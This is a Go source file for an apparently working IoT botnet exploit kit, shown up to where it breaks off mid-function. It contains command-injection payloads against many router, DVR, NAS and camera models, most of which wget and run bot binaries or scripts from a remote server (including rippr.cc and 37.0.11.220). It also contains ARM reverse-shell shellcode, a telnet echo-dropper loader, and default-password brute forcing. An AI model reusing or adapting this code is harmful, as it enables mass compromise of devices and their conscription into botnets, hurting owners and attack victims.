package main

import (
    "net"
    "time"
    "bufio"
    "fmt"
    "os"
    "sync"
    "strings"
    "strconv"
    "io/ioutil"
    "math/rand"
    "encoding/binary"
    "encoding/base64"
)

/*

Exploit kit framework 1.0.0.

Contains:
Reverse shell loader (DONE)
Telnet loader (arch detect, dir detect, echo load) (DONE)

Exploits:
UCHTTPD (DONE)
TVT-4567 (DONE)
TVT-WEB (DONE)
UNIX CCTV (DONE)
FIBERHOME ROUTER (DONE)
VIGOR ROUTER (DONE)
COMTREND ROUTER (DONE)
GPONFIBER ROUTER (DONE)
BROADCOM ROUTER (DONE)
DVRIP (DONE)
LIBDVR (DONE)
HONGDIAN ROUTER (DONE)
REALTEK MULTI ROUTER (DONE)
TENDA ROUTER (DONE)
TOTOLINK ROUTER (DONE)
ALCATEL NAS (DONE)
LILINDVR (DONE)
LINKSYS ESERIES (DONE)
*/

const (
	EI_NIDENT int = 16
	EI_DATA int = 5
	EE_LITTLE int = 1
	EE_BIG int = 2

	EM_ARM int = 40
	EM_MIPS int = 8
	EM_AARCH64 int = 183
	EM_PPC int = 20
	EM_PPC64 int = 21
	EM_SH int = 42

	DVRIP_NORESP int = 0
	DVRIP_OK int = 100
	DVRIP_FAILED int = 203
	DVRIP_UPGRADED int = 515

    echoLineLen = 128
    echoDlrOutFile = "qn_local"

    loaderTvtWebTag = "selfrep.tvt"
    loaderTvt4567Tag = "selfrep.tvt"
    loaderVigorTag = "selfrep.vigor"
    loaderComtrendTag = "selfrep.comtrend"
    loaderGponfiberTag = "selfrep.gponfiber"
    loaderFiberhomeTag = "selfrep.fiberhome"
    loaderLibdvrTag = "selfrep.libdvr"
    loaderDvripTag = "selfrep.dvrip"
    loaderUchttpdTag = "selfrep.uchttpd"
    loaderHongdianTag = "selfrep.hongdian"
    loaderTendaTag = "selfrep.tenda"
    loaderTotolinkTag = "selfrep.totolink"
    loaderZyxelTag = "selfrep.zyxel"
    loaderAlcatleTag = "selfrep.alcatel"
    loaderLilinTag = "selfrep.lilin"
	loaderLinksysTag = "selfrep.linksys"
	loaderZteTag = "selfrep.zte"
	loaderNetgearTag = "selfrep.netgear"
	loaderDlinkTag = "selfrep.dlink"

    loaderDownloadServer = "1.1.1.1" // Remote IP Of Server With Bins And Sh Files
    loaderBinsLocation = "/a/b/" // Path To Bins
    loaderScriptsLocation = "/a/" // Path To Bins
)

type elfHeader struct {
	e_ident[EI_NIDENT] int8
    e_type, e_machine int16
    e_version int32
}

type smapsRegion struct {
    region uint64
    size, pss, rss int
    shared_clean, shared_ditry int
    private_clean, private_dirty int
}

type echoDropper struct {
    payload [128]string
    payload_count int
}

var (
    netTimeout time.Duration = 30
    workerGroup sync.WaitGroup
    magicGroup sync.WaitGroup
    mode, doExploit string
    exploitMap map[string]interface{}
    dropperMap map[string]echoDropper
)

// counters
var telShells, payloadSent int

var (
	// uc exploit settings
    // should be reverse shell to same ip as loader on port 31391
    uchttpdShellCode string = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x11\xa1\x8a\x78\x01\x3a\x8a\x70\x02\x21\x08\x1c\x01\x21\x92\x1a\x0f\x02\x19\x37\x01\xdf\x06\x1c\x0b\xa1\x02\x23\x0b\x80\x10\x22\x02\x37\x01\xdf\x3e\x27\x01\x37\xc8\x21\x30\x1c\x01\xdf\x01\x39\xfb\xd5\x07\xa0\x92\x1a\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x01\x21\x08\x1c\x01\xdf\xc0\x46\xff\xff\x7b\xb4\xb9\x35\x5a\x13\x2f\x62\x69\x6e\x2f\x73\x68\x58\xff\xff\xc0\x46\xef\xbe\xad\xde"
    ucRshellPort int = 31412

    // tvt exploit settings
    tvtWebPayload string = "cd${IFS}/tmp;wget${IFS}http://" + loaderDownloadServer + loaderScriptsLocation + "wget.sh${IFS}-O-${IFS}>sfs;chmod${IFS}777${IFS}sfs;sh${IFS}sfs${IFS}" + loaderTvtWebTag
    tvt4567Payload string = "cd${IFS}/tmp;wget${IFS}http://" + loaderDownloadServer + loaderScriptsLocation + "wget.sh${IFS}-O-${IFS}>sfs;chmod${IFS}777${IFS}sfs;sh${IFS}sfs${IFS}" + loaderTvt4567Tag

	// magic exploit settings
    magicPacketIds []string = []string{"\x62", "\x69", "\x6c", "\x52", "\x44", "\x67", "\x43", "\x4d"}
    magicPorts []int = []int{1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 8020, 8030, 8040, 8050, 8060, 8070, 8080, 8090, 8100, 8200, 8300, 8400, 8500, 8600, 8700, 8800, 8888, 8900, 8999, 9000, 9090}
    magicPayload string = "wget http://rippr.cc/u -O-|sh;"
	
    // lilindvr payload
	lilinPayload string = "wget -O- http://" + loaderDownloadServer + "/l|sh"

	// fiberhome exploit settings
    fiberRandPort int = 1 // 0 for use below
    fiberStaticPort int = 31784
    fiberSecStrs []string = []string{"0.3123525368318707", "0.13378587435314315", "0.8071510413685209"}

	// vigor exploit settings
    vigorPayload string = "bin%2Fsh%24%7BIFS%7D-c%24%7BIFS%7D%27cd%24%7BIFS%7D%2Ftmp%24%7BIFS%7D%26%26%24%7BIFS%7Dbusybox%24%7BIFS%7Dwget%24%7BIFS%7Dhttp%3A%2F%2F" + loaderDownloadServer + loaderBinsLocation + "bot.arm7%24%7BIFS%7D%26%26%24%7BIFS%7Dchmod%24%7BIFS%7D777%24%7BIFS%7Dbot.arm7%24%7BIFS%7D%26%26%24%7BIFS%7D.%2Fbot.arm7%24%7BIFS%7D" + loaderVigorTag + "%24%7BIFS%7D%26%26%24%7BIFS%7Drm%24%7BIFS%7D-rf%24%7BIFS%7Dbot.arm7"

	// broadcom router settings
	broadcomPayload string = "$(wget%20http://" + loaderDownloadServer + "/b%20-O-|sh)"

	// hongdian router settings
	hongdianPayload string = "cd+/tmp%3Bbusybox+wget+http://" + loaderDownloadServer + loaderScriptsLocation + "wget.sh+-O-+>sfs;chmod+777+sfs%3Bsh+sfs+" + loaderHongdianTag + "%3Brm+-rf+sfs"

	// tenda router settings
	tendaPayload string = "cd%20/tmp%3Brm%20wget.sh%3Bwget%20http%3A//" + loaderDownloadServer + loaderScriptsLocation + "wget.sh%3Bchmod%20777%20wget.sh%3Bsh%20wget.sh%20" + loaderTendaTag

	// totlink router settings
	totolinkPayload string = "wget%20http%3A%2F%2F" + loaderDownloadServer + "%2Fa%2Fwget.sh%20-O%20-%20%3Esplash.sh%3B%20chmod%20777%20splash.sh%3B%20sh%20splash.sh%20" + loaderTotolinkTag

	// zyxel nas settings
	zyxelPayload string = "cd%20/tmp;wget%20http://" + loaderDownloadServer + loaderScriptsLocation + "wget.sh%20-O-%20>s;chmod%20777%20s;sh%20s%20" + loaderZyxelTag + ";"
	zyxelPayloadTwo string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + loaderDownloadServer + "%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+" + loaderZyxelTag + "%3Brm+-rf+wget.sh"

	// alcatel nas settings
	alcatelPayload string = "cd${IFS}/tmp;wget${IFS}http://" + loaderDownloadServer + loaderScriptsLocation + "wget.sh${IFS}-O-${IFS}>sfs;chmod${IFS}777${IFS}sfs;sh${IFS}sfs${IFS}" + loaderAlcatleTag

	// linksys router settings
	linksysPayload string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + loaderDownloadServer + "%2Fa%2Fwget.sh%3Bsh+wget.sh+" + loaderLinksysTag + "%3Brm+-rf+wget.sh"
	linksysTwoPayload string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + loaderDownloadServer + "%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+" + loaderLinksysTag + "%3Brm+-rf+wget.sh"

	// zte router settings
	ztePayload string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + loaderDownloadServer + "%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+" + loaderZyxelTag + "%3Brm+-rf+wget.sh"

	// netgear router settings
	netgearPayload string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + loaderDownloadServer + "%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+" + loaderNetgearTag + "%3Brm+-rf+wget.sh"

	// gpon router settings
	gponOGPayload string = "wget+http%3A%2F%2F" + loaderDownloadServer + "%2Fg+-O-%7Csh%60%3Bwget+http%3A%2F%2F37.0.11.220%2Fg+-O-%7Csh"

	// dlink router settings
	dlinkTwoPayload string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + loaderDownloadServer + "%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+" + loaderDlinkTag + "%3Brm+-rf+wget.sh"
	dlinkThreePayload string = "cd /tmp;wget http://" + loaderDownloadServer + "/a/wget.sh;chmod 777 wget.sh;sh wget.sh " + loaderDlinkTag + ";rm -rf wget.sh"
)

func zeroByte(a []byte) {

    for i := range a {
        a[i] = 0
    }
}

func getStringInBetween(str string, start string, end string) (result string) {

    s := strings.Index(str, start)
    if s == -1 {
        return
    }

    s += len(start)
    e := strings.Index(str, end)

    if (s > 0 && e > s + 1) {
        return str[s:e]
    } else {
        return "null"
    }
}

func randStr(strlen int) (string) {

	var b strings.Builder

    rand.Seed(time.Now().UnixNano())
    chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")

    for i := 0; i < strlen; i++ {
        b.WriteRune(chars[rand.Intn(len(chars))])
    }

    return b.String()
}

func hexToInt(hexStr string) (uint64) {
    cleaned := strings.Replace(hexStr, "0x", "", -1)
    result, _ := strconv.ParseUint(cleaned, 16, 64)
    return uint64(result)
}

/*        TELNET LOADER MODULE         */

func telnetLoadDroppers() {

    files, err := ioutil.ReadDir("dlrs")
    if err != nil {
        fmt.Printf("\033[1;31mError: Failed to open dlrs/\r\n")
        os.Exit(0)
    }

    for i := 0; i < len(files); i++ {
        file, err := os.OpenFile("dlrs/" + files[i].Name(), os.O_RDONLY, 0755)
        if err != nil {
            continue
        }

        mapVal := echoDropper{}
        mapVal.payload_count = 0

        for {
            var echoString string
            dataBuf := make([]byte, echoLineLen)

            length, err := file.Read(dataBuf)
            if err != nil || length <= 0 {
                break
            }

            for i := 0; i < length; i++ {
                echoByte := fmt.Sprintf("\\x%02x", uint8(dataBuf[i]))
                echoString += echoByte
            }

            if mapVal.payload_count == 0 {
                mapVal.payload[mapVal.payload_count] = fmt.Sprintf("echo -ne \"%s\" > ", echoString)
            } else {
                mapVal.payload[mapVal.payload_count] = fmt.Sprintf("echo -ne \"%s\" >> ", echoString)
            }

            mapVal.payload_count++
        }

        dropperMap[files[i].Name()] = mapVal
        file.Close()
    }

    fmt.Printf("\x1b[38;5;46mLoader\x1b[38;5;15m: \x1b[38;5;15mLoaded \x1b[38;5;134m%d\x1b[38;5;15m echo droppers\x1b[38;5;15m\x1b[38;5;15m\r\n", len(dropperMap))
}

func telnetHasPrompt(buffer string) (bool) {

	if strings.Contains(buffer, "#") || strings.Contains(buffer, ">") || strings.Contains(buffer, "$") || strings.Contains(buffer, "%") || strings.Contains(buffer, "@") {
		return true
	} else {
		return false
	}
}

func telnetBusyboxShell(conn net.Conn) {

	/* Looks wierd but dw its for some BCM router */
	conn.Write([]byte("sh\r\n"))
	conn.Write([]byte("..\r\n"))
	conn.Write([]byte("linuxshell\r\n"))
	/* ------------------------------------------ */

	conn.Write([]byte("enable\r\n"))
	conn.Write([]byte("development\r\n"))
	conn.Write([]byte("system\r\n"))
	conn.Write([]byte("sh\r\n"))
	conn.Write([]byte("shell\r\n"))
	conn.Write([]byte("ping ; sh\r\n"))
}

func telnetDropDropper(conn net.Conn, myarch string) (bool) {

    for arch, mapval := range dropperMap {
        splitVal := strings.Split(arch, ".")
        if len(splitVal) != 2 {
            continue
        }

        if splitVal[1] == myarch {
            query := randStr(5)
            dropper := randStr(5)
            droppedLines := 0

            for i := 0; i < mapval.payload_count; i++ {
                var rdbuf []byte = []byte("")
                complete := 0

                conn.Write([]byte(mapval.payload[i] + dropper + "; /bin/busybox " + query + "\r\n"))

                for {
                    tmpbuf := make([]byte, 128)
                    ln, err := conn.Read(tmpbuf)
                    if ln <= 0 || err != nil {
                        break
                    }

                    rdbuf = append(rdbuf, tmpbuf...)
                    if strings.Contains(string(rdbuf), ": applet not found") {
                        complete = 1
                        break
                    }
                }

                if complete == 0 {
                    return false
                }

                droppedLines++
            }

            if droppedLines == mapval.payload_count {
                var rdbuf []byte = []byte("")

                conn.Write([]byte("chmod 777 " + dropper + "; ./" + dropper + "; rm -rf " + dropper + "; /bin/busybox " + query + "\r\n"))

                for {
                    tmpbuf := make([]byte, 128)
                    ln, err := conn.Read(tmpbuf)
                    if ln <= 0 || err != nil {
                        break
                    }

                    rdbuf = append(rdbuf, tmpbuf...)
                    if strings.Contains(string(rdbuf), ": applet not found") {
                        return true
                    }
                }

                return false
            } else {
                return false
            }
        } else {
            continue
        }
    }

    return false
}

func telnetHasBusybox(conn net.Conn) (bool, string) {

	var rdbuf []byte = []byte("")

	query := randStr(6)
	resp := ": applet not found"

	conn.Write([]byte("/bin/busybox " + query + "\r\n"))
	for {
	    tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
		    break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), resp) == true {
			index := strings.Index(string(rdbuf), "BusyBox v")
			if index == -1 {
				return true, "unknown"
			} else {
				verstr := strings.Split(string(rdbuf)[len("BusyBox v")+index:], " ")
				if len(verstr) > 0 {
					return true, verstr[0]
				} else {
					return true, "unknown"
				}
				
			}
		}
	}

	return false, "unknown"
}

func telnetWritableDir(conn net.Conn) (bool, string) {

	var rdbuf []byte
	dirs := []string{"/tmp/", "/var/tmp/", "/var/", "/mnt/", "/etc/", "/", "/dev/"}

	for i := 0; i < len(dirs); i++ {
		echoStr := randStr(4)
		conn.Write([]byte("cd " + dirs[i] + " && echo " + echoStr + "\r\n"))

		for {
		    tmpbuf := make([]byte, 128)
			ln, err := conn.Read(tmpbuf)
			if ln <= 0 || err != nil {
			    break
			}

			rdbuf = append(rdbuf, tmpbuf...)
			if strings.Contains(string(rdbuf), "can't cd") || strings.Contains(string(rdbuf), "No such file or") {
				break
			} else if strings.Contains(string(rdbuf), echoStr) {
				return true, dirs[i]
			}
		}

		zeroByte(rdbuf)
	}

	return false, "none"
}

func telnetExtractArch(conn net.Conn) (bool, string) {

	var rdbuf []byte
	var index int = -1

	conn.Write([]byte("/bin/busybox cat /bin/echo\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		index = strings.Index(string(rdbuf), "ELF")

		if index != -1 {
			zeroByte(tmpbuf)
			ln, err := conn.Read(tmpbuf)

			if ln <= 0 || err != nil {
				break
			}

			rdbuf = append(rdbuf, tmpbuf...)
			break
		}
	}

	if index == -1 {
		return false, "none"
	}

	rdbuf = rdbuf[index:]
	elfHdr := elfHeader{}

	for i := 0; i < EI_NIDENT; i++ {
		elfHdr.e_ident[i] = int8(rdbuf[i])
	}

	elfHdr.e_type = int16(rdbuf[EI_NIDENT])
	elfHdr.e_machine = int16(rdbuf[EI_NIDENT + 2])
	elfHdr.e_version = int32(rdbuf[EI_NIDENT + 2 + 2])

	if elfHdr.e_machine == int16(EM_ARM) {
		return true, "arm"
	} else if elfHdr.e_machine == int16(EM_MIPS) {
		if elfHdr.e_ident[EI_DATA] == int8(EE_LITTLE) {
			return true, "mpsl"
		} else {
			return true, "mips"
		}
	} else if elfHdr.e_machine == int16(EM_PPC) || elfHdr.e_machine == int16(EM_PPC64) {
		return true, "ppc"
	} else if elfHdr.e_machine == int16(EM_SH) {
		return true, "sh4"
	}

	return false, ""
}

func telnetLoader(target string, dologin int, arch string, tag string) {

	var (
		rdbuf []byte = []byte("")
		loggedIn int = 0
	)

	conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        return    
    }

    if dologin == 0 {
	    for {
	    	tmpbuf := make([]byte, 128)
		    ln, err := conn.Read(tmpbuf)
		    if ln <= 0 || err != nil {
		    	break
		    }

		    rdbuf = append(rdbuf, tmpbuf...)
		    if telnetHasPrompt(string(rdbuf)) == true {
		    	loggedIn = 1
		    	break
		    }
	    }
	}

    zeroByte(rdbuf)
	if loggedIn == 0 {
		conn.Close()
		return
	}

	fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m shell found on device\x1b[38;5;15m\x1b[38;5;15m\r\n", target)
	telnetBusyboxShell(conn)

	has, ver := telnetHasBusybox(conn)
	if has == false {
		conn.Close()
		return
	}

	fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m device is running busybox version \x1b[38;5;134m%s\x1b[38;5;15m\r\n", target, ver)
    telShells++

	has, dir := telnetWritableDir(conn)
	if has == false {
		conn.Close()
		return
	}

	fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s:v%s\x1b[38;5;15m found writable directory \x1b[38;5;134m%s\x1b[38;5;15m\r\n", target, ver, dir)

    has, _ = telnetHasBusybox(conn)
    if has == false {
        conn.Close()
        return
    }

	fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s:v%s:%s\x1b[38;5;15m extracted arch \x1b[38;5;134m%s\x1b[38;5;15m\r\n", target, ver, dir, arch)
    
    dropped := telnetDropDropper(conn, arch)
    if dropped == false {
        conn.Close()
        return
    }

    fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s:v%s:%s:%s\x1b[38;5;15m finnished echo loading\x1b[38;5;15m\r\n", target, ver, dir, arch)
    
    binName := randStr(6)
    conn.Write([]byte("/bin/busybox cat " + echoDlrOutFile + " > " + binName + "; chmod 777 " + binName + "; ./" + binName + " " + tag + "\r\n"))
    // Done?
    time.Sleep(5 * time.Second)  
    conn.Close()
    return   
}

/* ------ END OF TELNET LOADER ------- */

/* ------ OTHER PROTOCOL STUFF ------- */

func reverseShellUchttpdLoader(conn net.Conn) {

	var (
		rdbuf []byte = []byte("")
		query string = randStr(5)
	)

	conn.Write([]byte(">/tmp/.h && cd /tmp/\r\n"))
	conn.Write([]byte(">/mnt/.h && cd /mnt/\r\n"))
	conn.Write([]byte(">/var/.h && cd /var/\r\n"))
	conn.Write([]byte(">/dev/.h && cd /dev/\r\n"))
	conn.Write([]byte(">/var/tmp/.h && cd /var/tmp/\r\n"))
	conn.Write([]byte("/bin/busybox " + query + "\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			conn.Close()
			return
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), ": applet not found") {
			break
		}
	}

	zeroByte(rdbuf)
	
    dropped := telnetDropDropper(conn, "arm7")
    if dropped == false {
        conn.Close()
        return
    }

    fmt.Printf("\x1b[38;5;46mUchttpd\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", conn.RemoteAddr())
    payloadSent++
    binName := randStr(6)
    conn.Write([]byte("/bin/busybox cat " + echoDlrOutFile + " > " + binName + "; chmod 777 " + binName + "; ./" + binName + " " + loaderUchttpdTag + ";\r\n"))
	conn.Write([]byte("/var/Sofia 2>/dev/null &\r\n"))
	return
}

func infectFunctionTvt4567(conn net.Conn) {

    var (
        rdbuf []byte = []byte("")
        state = 0
    )

    payload := "\x0c\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x21\x00\x02\x00\x01\x00\x04\x00\x50\x02\x00\x00\x50\x02\x00\x00\x00\x00\x00\x00\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22\x75\x74\x66\x2d\x38\x22\x3f\x3e\x3c\x72\x65\x71\x75\x65\x73\x74\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x20\x73\x79\x73\x74\x65\x6d\x54\x79\x70\x65\x3d\x22\x4e\x56\x4d\x53\x2d\x39\x30\x30\x30\x22\x20\x63\x6c\x69\x65\x6e\x74\x54\x79\x70\x65\x3d\x22\x57\x45\x42\x22\x3e\x3c\x74\x79\x70\x65\x73\x3e\x3c\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x4d\x6f\x64\x65\x3e\x3c\x65\x6e\x75\x6d\x3e\x72\x65\x66\x75\x73\x65\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x65\x6e\x75\x6d\x3e\x61\x6c\x6c\x6f\x77\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x2f\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x4d\x6f\x64\x65\x3e\x3c\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x3e\x3c\x65\x6e\x75\x6d\x3e\x69\x70\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x65\x6e\x75\x6d\x3e\x69\x70\x72\x61\x6e\x67\x65\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x65\x6e\x75\x6d\x3e\x6d\x61\x63\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x2f\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x3e\x3c\x2f\x74\x79\x70\x65\x73\x3e\x3c\x63\x6f\x6e\x74\x65\x6e\x74\x3e\x3c\x73\x77\x69\x74\x63\x68\x3e\x74\x72\x75\x65\x3c\x2f\x73\x77\x69\x74\x63\x68\x3e\x3c\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x20\x74\x79\x70\x65\x3d\x22\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x4d\x6f\x64\x65\x22\x3e\x72\x65\x66\x75\x73\x65\x3c\x2f\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x3e\x3c\x66\x69\x6c\x74\x65\x72\x4c\x69\x73\x74\x20\x74\x79\x70\x65\x3d\x22\x6c\x69\x73\x74\x22\x3e\x3c\x69\x74\x65\x6d\x54\x79\x70\x65\x3e\x3c\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x20\x74\x79\x70\x65\x3d\x22\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x22\x2f\x3e\x3c\x2f\x69\x74\x65\x6d\x54\x79\x70\x65\x3e\x3c\x69\x74\x65\x6d\x3e\x3c\x73\x77\x69\x74\x63\x68\x3e\x74\x72\x75\x65\x3c\x2f\x73\x77\x69\x74\x63\x68\x3e\x3c\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x3e\x69\x70\x3c\x2f\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x3e\x3c\x69\x70\x3e\x24\x28"
    payload += tvt4567Payload
    payload += "\x3c\x2f\x69\x70\x3e\x3c\x2f\x69\x74\x65\x6d\x3e\x3c\x2f\x66\x69\x6c\x74\x65\x72\x4c\x69\x73\x74\x3e\x3c\x2f\x63\x6f\x6e\x74\x65\x6e\x74\x3e\x3c\x2f\x72\x65\x71\x75\x65\x73\x74\x3e\x00"
    payload = base64.StdEncoding.EncodeToString([]byte(payload))

    cntlen := strconv.Itoa(len(payload))

    conn.Write([]byte("{D79E94C5-70F0-46BD-965B-E17497CCB598}"))

    for {
        tmpbuf := make([]byte, 128)
        ln, err := conn.Read(tmpbuf)
        if ln <= 0 || err != nil {
            break
        }

        rdbuf = append(rdbuf, tmpbuf...)
        if strings.Contains(string(rdbuf), "{D79E94C5-70F0-46BD-965B-E17497CCB598}") && state != 1 {
            conn.Write([]byte("GET /saveSystemConfig HTTP/1.1\r\nAuthorization: Basic\r\nContent-type: text/xml\r\nContent-Length: " + cntlen + "\r\n{D79E94C5-70F0-46BD-965B-E17497CCB598} 2\r\n\r\n" + payload + "\r\n\r\n"))
            zeroByte(rdbuf)
            state = 1
            continue
        } else if strings.Contains(string(rdbuf), "200") && state == 1 {
            fmt.Printf("\x1b[38;5;46mTvt-4567\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", conn.RemoteAddr().String())
            conn.Close()
            payloadSent++
            return
        }
    }

    conn.Close()
}

func infectFunctionMagicProto(target string) {

    var (
        rdbuf []byte = []byte("")
        state = 0
    )

    conn, err := net.DialTimeout("tcp", target, 10 * time.Second)
    if err != nil {
        magicGroup.Done()
        return
    }

    payloadOne := "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00"
    payloadTwo := "\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26"
    payloadThree := "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00"

    conn.Write([]byte("\x5a\xa5\x01\x20\x00\x00\x00\x00"))

    for {
        tmpbuf := make([]byte, 128)
        ln, err := conn.Read(tmpbuf)
        if ln <= 0 || err != nil {
            break
        }

        rdbuf = append(rdbuf, tmpbuf...)
        if state == 0 && len(rdbuf) >= 4 && string(rdbuf[:4]) == "\x5a\xa5\x01\x20" {
            conn.Close()

            conn, err = net.DialTimeout("tcp", target, 10 * time.Second)
            if err != nil {
                magicGroup.Done()
                return 
            }

            payload := payloadOne
            payload += magicPacketIds[state]
            payload += payloadTwo
            payload += magicPayload + "f"
            payload += payloadThree

            conn.Write([]byte(payload))
            state++
            zeroByte(rdbuf)
            continue
        } else if state >= 1 {
            conn.Close()

            if state == 8 {
                fmt.Printf("\x1b[38;5;46mMagic\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m potential payload sent to device\x1b[38;5;15m\r\n", target)
                payloadSent++
                magicGroup.Done()
                return
            }
            conn, err = net.DialTimeout("tcp", target, 10 * time.Second)
            if err != nil {
                magicGroup.Done()
                return 
            }

            payload := payloadOne
            payload += magicPacketIds[state]
            payload += payloadTwo
            payload += magicPayload + "f"
            payload += payloadThree
            
            conn.Write([]byte(payload))
            state++
            zeroByte(rdbuf)
            continue
        }
    }

    conn.Close()
    magicGroup.Done()
    return
}

func infectFunctionLibdvrProto(host string, attempt int) (int, error, string, int) {

	var gotAdmin int = 0
	var gotShell int = 0
	var password string
	var rInt int = 0

	rInt = rand.Intn(9999 - 9000) + 9000

    conn, err := net.DialTimeout("tcp", host, time.Duration(10) * time.Second)
    if err != nil {
        return 0, nil, "", 0
    }

    defer conn.Close()
    conn.SetWriteDeadline(time.Now().Add(6 * time.Second))
    _, err = conn.Write([]byte("/bin/busybox BOXOFABOX\n"))
    if err != nil {
    	conn.Close()
        return 0, nil, "", 0
    }

    conn.SetReadDeadline(time.Now().Add(6 * time.Second))

    first_buf := make([]byte, 256)
    l, err := conn.Read(first_buf)
    if err != nil || l <= 0 {
        conn.Close()
        return 0, nil, "", 0
    }

    if strings.Contains(string(first_buf), "user name") || strings.Contains(string(first_buf), "username") {
		_, err = conn.Write([]byte("admin\n"))
		if err != nil {
			conn.Close()
		    return 0, nil, "", 0
		}
    } else {
    	if strings.Contains(string(first_buf), "BOXOFABOX: applet not found") {
    		gotShell = 1
    	} else {
		    _, err = conn.Write([]byte("\n"))
		    if err != nil {
		    	conn.Close()
		        return 0, nil, "", 0
		    }

		    conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		    first_buf := make([]byte, 256)
		    l, err := conn.Read(first_buf)
		    if err != nil || l <= 0 {
		        conn.Close()
		        return 0, nil, "", 0
		    }

		    if !strings.Contains(string(first_buf), "user name") && !strings.Contains(string(first_buf), "username") {
		    	if strings.Contains(string(first_buf), "admin$") {
		    		gotAdmin = 1
		    	} else {
		    		conn.Close()
		    		return 0, nil, "", 0
		    	}
		    } else {
			    _, err = conn.Write([]byte("admin\n"))
			    if err != nil {
			    	conn.Close()
			        return 0, nil, "", 0
			    }
		    }
    	}
    }

   	if gotAdmin != 1 && gotShell != 1 {
	    conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	    second_buf := make([]byte, 256)
	    l2, err := conn.Read(second_buf)
	    if err != nil || l2 <= 0 {
	        conn.Close()
	        return 0, nil, "", 0
	    }

	    if strings.Contains(string(second_buf), "pass word") || strings.Contains(string(second_buf), "password") {
	    	if attempt == 0 {
	    		password = "I0TO5Wv9"
	    	} else if attempt == 1 {
	    		password = "123456"
	    	} else if attempt == 2 {
	    		password = "admin"
	    	}

		    _, err = conn.Write([]byte(password + "\n"))
		    if err != nil {
		    	conn.Close()
		        return 0, nil, "", 0
		    }

		    conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		    second_buf := make([]byte, 1024)
		    l, err := conn.Read(second_buf)
		    if err != nil || l <= 0 {
		        conn.Close()
		        return 0, nil, "", 0
		    }

		    if strings.Contains(string(second_buf), "admin$") {
		    	gotAdmin = 1
		    } else {
		    	conn.Close()
